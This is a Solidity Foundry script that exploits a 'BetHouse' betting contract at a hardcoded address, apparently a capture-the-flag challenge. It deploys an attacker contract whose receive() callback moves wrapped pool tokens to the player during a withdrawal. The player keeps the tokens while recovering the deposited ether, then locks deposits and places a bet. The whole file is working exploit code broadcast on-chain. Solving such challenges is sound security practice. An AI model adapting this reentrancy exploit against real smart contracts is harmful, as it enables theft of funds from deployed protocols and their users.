// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/BetHouse.sol";
import "forge-std/Script.sol";

contract Ex {
    address player_;
    address bh_;
    address pool_;
    address wrappedToken_;

    constructor(address bh, address player) {
        player_ = player;
        bh_ = bh;
        pool_ = BetHouse(bh_).pool();
        wrappedToken_ = Pool(pool_).wrappedToken();
    }

    function ex() public payable {
        Pool(pool_).deposit{value: 0.001 ether}(0);
        Pool(pool_).withdrawAll();
    }

    receive() external payable {
        PoolToken(wrappedToken_).transfer(player_, PoolToken(wrappedToken_).balanceOf(address(this)));
    }
}

contract BetHouseSol is Script {
    BetHouse public bh_ = BetHouse(0x79584991826ED6A24628eA66865Ce0C044Fea450);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex(address(bh_), msg.sender);
        ex.ex{value: 0.002 ether}();

        Pool(bh_.pool()).deposit{value: 0.001 ether}(0);
        console.log("wrappedToken balance: ", Pool(bh_.pool()).balanceOf(msg.sender));

        Pool(bh_.pool()).lockDeposits();
        console.log("depositsLocked: ", Pool(bh_.pool()).depositsLocked(msg.sender));

        bh_.makeBet(msg.sender);
        console.log("isBettor: ", bh_.isBettor(msg.sender));

        vm.stopBroadcast();
    }
}